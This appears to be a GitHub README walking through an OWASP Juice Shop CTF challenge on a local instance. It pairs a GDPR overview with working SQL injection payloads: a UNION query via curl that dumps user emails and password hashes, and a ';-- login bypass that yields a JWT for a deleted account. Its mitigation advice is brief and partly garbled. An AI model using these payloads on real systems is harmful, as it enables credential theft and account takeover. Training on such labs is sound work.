# OWASP-juice-shop-2025--GDPR-Data-Erasure-Broken-Authentication-SQL-injection-PoC-Walkthrough

## This repository contains a concise, hands-on walkthrough for a SQL Injection challenge in the OWASP Juice Shop CTF environment. It is intended for educational and defensive purposes only.

### What you will find here:
- A clear explanation of how the vulnerable endpoint behaves and how to detect SQL injection vectors.
- A Proof-of-Concept demonstrating how extracted data might be leveraged in a Capture-the-Flag (CTF) context.
- Guidance on safe testing practices and how to reproduce the scenario in a local, isolated environment.
- Recommended mitigations and secure development practices to prevent this class of vulnerabilities.

**Important:** This PoC is provided for learning, testing and hardening purposes on systems you own or have explicit permission to test. Do not use it against systems without authorization.

## What is actualy GDPR ?
GDPR it is acronym for General Data Protection Regulation.
Officialy it is basically Regulation (EU) 2016/679 of European Parliament and of Council of 27 April 2016 regarding protection 
of natural persons with regard to the processing of any data on free access to such data.

Key provisions of the GDPR:
1. Application:
The regulation applies to all companies that process the personal data of European Union citizens, regardless of whether the company is located within the EU or outside it.
2. Purpose:
To protect privacy and control over their personal data.
Everyone should understand:
• who collects the data,
• why,
• how it is stored,
• how it can be deleted or corrected.
3. Basic principles:
• Lawfulness, fairness, transparency.
The user should know what data is being collected and why.
• Purpose limitation.
Data may only be used for the purposes stated in advance.
• Data minimization.
Collect only what is truly necessary.
• Accuracy.
Data must be kept current and accurate.
• Storage limitation.
Delete when data is no longer needed.
• Confidentiality and integrity.
Data must be protected from leaks and unauthorized access. 4. Rights of the data subject (individual):
• Right to access their data.
• Right to rectification or erasure ("right to be forgotten").
• Right to restriction of processing.
• Right to data portability.
• Right to object to processing.
5. Fines for violations:
• Up to €20 million or 4% of the company's annual turnover, whichever is greater.

## Identification of SQL data base vulnarability

The core development mistake in this case is the string concatenation used to build SQL queries, which makes the application vulnerable to SQL injection.
For start, let's see some examples from developer side, and little bit dive to the reason of this SQL vulnerability.

```bash
http://127.0.0.1:3000/rest/products/search?q=
```
?q= is the part of the URL that denotes the query string. Formally, it is a query parameter named q and has a value, for example:
The value q (often short for query or query string) is traditionally used to pass a search query to the server, but technically q is a regular parameter; the name can be anything.

The vulnerable request template could look like this (pseudocode):

```sql
sql = "SELECT id, name, description FROM products WHERE name LIKE '%" + q + "%'"
```
Here in the template there are indeed opening and closing quotes around %...%. The problem is that q is substituted inside these quotes as a raw string.

## Exploit:

If q is a regular search text, everything is fine. If q opens with the escape character ' or the sequence ), UNION, --, the string literal is closed earlier, and the remainder becomes SQL code. The result is a change in the query structure (injection).
Example:
If q = non-existentvalue, the query is correct:

```sql
SELECT id, name, description FROM products WHERE name LIKE '%non-existentvalue%'
```
But if q contains a malicious sequence:
then after substitution we get (percent-decoded and in one line):

```sql
SELECT id, name, description FROM products WHERE name LIKE '%non-existentvalue')) UNION ALL SELECT 1,email,username,4,password,6,7,8,9 FROM Users -- %'
```

Result:

The first part of '%non-existentvalue' is closed—the attacker executes from a string literal;
))/parentheses can align the syntax depending on the original query;
UNION ALL SELECT ... FROM Users adds rows from the Users tables;
-- comments out the rest of the original string to avoid breaking the syntax.

Result: the server executed a completely different, valid SQL statement, including data from Users.

```bash
curl -i "http://127.0.0.1:3000/rest/products/search?q=non-existentvalue'))%20union%20all%20select%201,email,username,4,password,6,7,8,9%20from%20Users%20--%20"
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 3704
ETag: W/"e78-VcK8FPQ5q6ywOFtWrkI/1owjK3M"
Vary: Accept-Encoding
Date: Wed, 05 Nov 2025 16:27:45 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"status":"success","data":[{"id":1,"name":"admin@juice-sh.op","description":"","price":4,"deluxePrice":"0192023a7bbd73250516f069df18b500","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"jim@juice-sh.op","description":"","price":4,"deluxePrice":"e541ca7ecf72b8d1286474fc613e5e45","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"bender@juice-sh.op","description":"","price":4,"deluxePrice":"0c36e517e3fa95aabf1bbffc6744a4ef","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"bjoern.kimminich@gmail.com","description":"bkimminich","price":4,"deluxePrice":"6edd9d726cbdc873c539e41ae8757b8c","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"ciso@juice-sh.op","description":"","price":4,"deluxePrice":"861917d5fa5f1172f931dc700d81a8fb","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"support@juice-sh.op","description":"","price":4,"deluxePrice":"3869433d74e3d0c86fd25562f836bc82","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"morty@juice-sh.op","description":"","price":4,"deluxePrice":"f2f933d0bb0ba057bc8e33b8ebd6d9e8","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"mc.safesearch@juice-sh.op","description":"","price":4,"deluxePrice":"b03f4b0ba8b458fa0acdc02cdb953bc8","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"J12934@juice-sh.op","description":"","price":4,"deluxePrice":"3c2abc04e4a6ea8f1327d0aae3714b7d","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"wurstbrot@juice-sh.op","description":"wurstbrot","price":4,"deluxePrice":"9ad5b0492bbe528583e128d2a8941de4","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"amy@juice-sh.op","description":"","price":4,"deluxePrice":"030f05e45e30710c3ad3c32f00de0473","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"bjoern@juice-sh.op","description":"","price":4,"deluxePrice":"7f311911af16fa8f418dd1a3051d6810","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"bjoern@owasp.org","description":"","price":4,"deluxePrice":"9283f1b2e9669749081963be0462e466","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"chris.pike@juice-sh.op","description":"","price":4,"deluxePrice":"10a783b9ed19ea1c67c3a27699f0095b","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"accountant@juice-sh.op","description":"","price":4,"deluxePrice":"963e10f92a70b4b463220cb4c5d636dc","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"uvogin@juice-sh.op","description":"","price":4,"deluxePrice":"05f92148b4b60f7dacd04cceebb8f1af","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"demo","description":"","price":4,"deluxePrice":"fe01ce2a7fbac8fafaed7c982a04e229","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"john@juice-sh.op","description":"j0hNny","price":4,"deluxePrice":"00479e957b6b42c459ee5746478e4d45","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"emma@juice-sh.op","description":"E=ma²","price":4,"deluxePrice":"402f1c4a75e316afec5a6ea63147f739","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"stan@juice-sh.op","description":"SmilinStan","price":4,"deluxePrice":"e9048a3f43dd5e094ef733f3bd88ea64","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"ethereum@juice-sh.op","description":"evmrox","price":4,"deluxePrice":"2c17c6393771ee3048ae34d6b380c5ec","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"testing@juice-sh.op","description":"","price":4,"deluxePrice":"b616a64605a07941fbd31868aea3b54b","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}
```

Key elements that change behavior:

Single quote (') — closes the string literal;
Parentheses ()) — adjust syntax depending on the context;
UNION — joins your SELECT with the attacker's SELECT (if the column types are compatible);
- or /* ... */ — comment out the remainder of the original query.

Conclusion: protection must check the feasibility of such transformations to parameterize the counter and control input parts.


## Authorisation to removed Chris account:

```sql
SELECT id FROM users WHERE email = '<email>' AND password = '<password>';
```
The ';--' insertion ensures the email='...' condition and comments out the rest (AND password = '...'). Depending on the server logic, such a query may return the first character set or bypass the administrator password—which is what happened with the token issuance. This is a classic SQLi authentication bypass technique.

Request:

```bash
POST http://127.0.0.1:3000/rest/user/login HTTP/1.1
host: 127.0.0.1:3000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: application/json, text/plain, */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/json
content-length: 58
Origin: http://127.0.0.1:3000
Connection: keep-alive
Referer: http://127.0.0.1:3000/
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

{"email":"chris.pike@juice-sh.op';--","password":"hacked"}
```
Response:

```bash
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 847
ETag: W/"34f-HOyKReNtz027Jb0K878R7FA7sZo"
Vary: Accept-Encoding
Date: Wed, 05 Nov 2025 16:57:33 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJjaHJpcy5waWtlQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIxMGE3ODNiOWVkMTllYTFjNjdjM2EyNzY5OWYwMDk1YiIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTExLTAyIDE4OjEwOjAxLjQ1MCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI1LTExLTAyIDE4OjEwOjAxLjQ1MCArMDA6MDAiLCJkZWxldGVkQXQiOiIyMDI1LTExLTAyIDE4OjEwOjAxLjk0OSArMDA6MDAifSwiaWF0IjoxNzYyMzYxODU0fQ.ihsniI-RLYK2q8foSCn3CasLt0XPMF0jtDZpqklijwZ5UELp4aS5EQVhptUm4QyfjHlEoLPw7K-cIrfyBWs_4FzHjE959ayTgz0FO5tUcwFwTWY4Ju6nOIthGmrhEPkN6VEfck22SVYnrYTEZIPVBO6eJhB9BpoQTKf9yPy6neE","bid":7,"umail":"chris.pike@juice-sh.op"}}
```
As result we can login and get the valid JWT Token for erlier deleted account.












